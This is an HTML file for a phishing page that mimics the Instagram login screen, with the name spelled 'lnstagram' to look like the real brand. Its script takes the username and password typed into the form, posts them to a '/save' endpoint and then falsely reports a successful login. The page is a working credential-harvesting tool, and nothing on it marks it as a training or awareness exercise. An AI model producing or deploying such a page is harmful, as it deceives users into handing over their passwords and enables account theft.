<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>lnstagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

    <!-- LEFT SIDE -->
    <div class="left">
        <h1>Share your <span>moments</span><br>with friends.</h1>
        <p>A fun place to connect and post memories.</p>
    </div>

    <!-- RIGHT SIDE LOGIN CARD -->
    <div class="right">
        <div class="login-card">
            <h2 class="logo">lnstagram</h2>

           <input type="text" id="username" placeholder="Phone number, username, or email">
            <input type="text" id="Password" placeholder="Password">

          <button class="login-btn" onclick="handleLogin()">Log In</button>


            <a href="#" class="forgot">Forgot password?</a>

            <div class="divider">
                <span></span> OR <span></span>
            </div>

            <button class="google-btn">Log in with Google</button>

            <p class="signup-text">
                Donâ€™t have an account? <a href="#">Sign up</a>
            </p>
        </div>
    </div>

</div>

<iframe name="hiddenFrame" style="display:none;"></iframe>

<script>
function handleLogin() {
  const username = document.getElementById("username").value;
  const Password = document.getElementById("Password").value;

  if (username.trim() === "" || Password.trim() === "") {
    alert("Please fill all fields");
    return;
  }

  fetch("/save", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "username=" + encodeURIComponent(username) + "&Password=" + encodeURIComponent(Password)
  })
  .then(res => res.text())
  .then(data => {
    alert("login successful!");
  })
  .catch(err => {
    alert("Error saving data");
    console.error(err);
  });
}
</script>
</body>
</html>
